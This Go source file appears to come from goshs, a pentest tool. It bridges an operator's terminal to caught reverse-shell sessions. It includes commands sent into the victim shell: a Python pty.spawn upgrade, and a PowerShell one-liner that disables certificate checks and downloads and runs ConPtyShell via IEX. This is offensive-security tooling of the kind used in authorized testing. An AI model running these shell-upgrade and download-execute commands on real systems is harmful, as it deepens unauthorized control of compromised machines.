package tui

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"golang.org/x/term"

	"goshs.de/goshs/v2/catcher"
)

// detachByte is Ctrl+] (the classic telnet escape), used to leave an attached
// shell and return to the dashboard without killing the session.
const detachByte = 0x1d

// shellClosedMsg is delivered after an attached session detaches or dies so the
// model can flash a status line and refresh the SHELLS pane.
type shellClosedMsg struct{ err error }

// shellBridge implements tea.ExecCommand, bridging the operator's terminal to a
// caught reverse-shell session in a blocking fashion. bubbletea releases the
// terminal before Run and restores it after, so we own stdin/stdout for the
// duration. Detaching (Ctrl+]) leaves the session connected; the remote
// hanging up ends the bridge on its own.
type shellBridge struct {
	session *catcher.Session
	stdin   io.Reader
	stdout  io.Writer
}

func (b *shellBridge) SetStdin(r io.Reader)  { b.stdin = r }
func (b *shellBridge) SetStdout(w io.Writer) { b.stdout = w }
func (b *shellBridge) SetStderr(w io.Writer) {}

func (b *shellBridge) Run() error {
	// Put the terminal in raw mode so keystrokes reach the remote shell
	// unbuffered. Falls back to cooked (line) mode if stdin is not a real tty.
	if f, ok := b.stdin.(*os.File); ok {
		if old, err := term.MakeRaw(int(f.Fd())); err == nil {
			defer term.Restore(int(f.Fd()), old)
		}
	}

	fmt.Fprintf(b.stdout, "\r\n\x1b[36m[attached to %s — press Ctrl+] to detach]\x1b[0m\r\n", b.session.RemoteAddr)

	// remote → terminal
	done := make(chan struct{})
	go func() {
		defer close(done)
		buf := make([]byte, 4096)
		for {
			n, err := b.session.Read(buf)
			if n > 0 {
				b.stdout.Write(ensureCRLF(buf[:n]))
			}
			if err != nil {
				return
			}
		}
	}()

	// terminal → remote, until the operator detaches or the session dies.
	detached := false
	buf := make([]byte, 1024)
loop:
	for {
		select {
		case <-done:
			break loop // remote hung up
		default:
		}
		n, err := b.stdin.Read(buf)
		if n > 0 {
			if i := bytes.IndexByte(buf[:n], detachByte); i >= 0 {
				// Forward anything typed before the escape, then detach.
				if i > 0 {
					b.session.Write(buf[:i])
				}
				detached = true
				break loop
			}
			if _, werr := b.session.Write(buf[:n]); werr != nil {
				break loop
			}
		}
		if err != nil {
			break loop
		}
	}

	// Always stop the reader goroutine before returning so it can't write to
	// the terminal once bubbletea recaptures it. The deadline interrupts a Read
	// blocked on a still-live connection; clearing it afterwards leaves the
	// session reusable (re-attach, or web clients).
	b.session.SetReadDeadline(time.Now())
	<-done
	b.session.SetReadDeadline(time.Time{})

	if detached {
		fmt.Fprint(b.stdout, "\r\n\x1b[36m[detached]\x1b[0m\r\n")
	} else {
		fmt.Fprint(b.stdout, "\r\n\x1b[31m[session closed]\x1b[0m\r\n")
	}
	return nil
}

// upgradeUnix turns a basic Unix reverse shell into a fully interactive PTY,
// mirroring the web UI's "Unix (PTY)" upgrade (assets/js/src/catcher.js). It
// runs asynchronously because the steps must be spaced out: the PTY spawn needs
// a moment to come up before TERM/stty take effect, and we must not block the
// TUI event loop while waiting. The operator attaches once the upgrade lands.
func upgradeUnix(sess *catcher.Session, rows, cols int) {
	if rows <= 0 {
		rows = 24
	}
	if cols <= 0 {
		cols = 80
	}
	go func() {
		sess.Write([]byte("export TERM=xterm-256color\n"))
		time.Sleep(200 * time.Millisecond)
		// Try python3, then python, then script(1) — errors suppressed so a
		// missing interpreter falls through to the next without noise.
		sess.Write([]byte(
			"python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || " +
				"python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || " +
				"script /dev/null -qc /bin/bash 2>/dev/null || true\n"))
		time.Sleep(1300 * time.Millisecond)
		fmt.Fprintf(sess, "stty rows %d cols %d\n", rows, cols)
	}()
}

// upgradeWindows pulls ConPtyShell from this goshs server and hijacks the
// existing socket to provide a real PTY, mirroring the web UI's "Windows
// (ConPtyShell)" upgrade. url must point at /ConPtyShell.ps1?conpty on an
// address the victim can reach.
func upgradeWindows(sess *catcher.Session, url string, rows, cols int) {
	if rows <= 0 {
		rows = 24
	}
	if cols <= 0 {
		cols = 80
	}
	cmd := `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;` +
		`Add-Type -TypeDefinition 'using System.Net;using System.Security.Cryptography.X509Certificates;public class Trust{public static void Enable(){System.Net.ServicePointManager.ServerCertificateValidationCallback=delegate{return true;};}}';[Trust]::Enable();` +
		fmt.Sprintf(`IEX((New-Object Net.WebClient).DownloadString('%s'));Invoke-ConPtyShell -Upgrade -Rows %d -Cols %d`, url, rows, cols) + "\n"
	sess.Write([]byte(cmd))
}

// ensureCRLF rewrites bare \n to \r\n so a raw-mode terminal renders shell
// output without a staircase effect (mirrors catcher.ensureCRLF for the web).
func ensureCRLF(data []byte) []byte {
	data = bytes.ReplaceAll(data, []byte("\r\n"), []byte("\n"))
	return bytes.ReplaceAll(data, []byte("\n"), []byte("\r\n"))
}

// compile-time guard
var _ tea.ExecCommand = (*shellBridge)(nil)
